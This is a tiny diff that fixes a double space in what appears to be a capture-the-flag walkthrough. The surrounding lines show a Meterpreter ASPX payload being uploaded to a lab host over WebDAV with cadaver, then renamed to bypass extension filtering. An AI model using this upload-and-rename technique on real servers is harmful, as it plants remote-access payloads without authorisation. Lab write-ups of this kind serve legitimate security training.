@@ -248,7 +248,7 @@ exploit -j -z
 
 ```
 root@kali:~# cp meterpreter/m.aspx m.txt
-root@kali:~# cadaver  http://10.10.10.15
+root@kali:~# cadaver http://10.10.10.15
 dav:/> put m.txt
 dav:/> move m.txt m.aspx
 ```
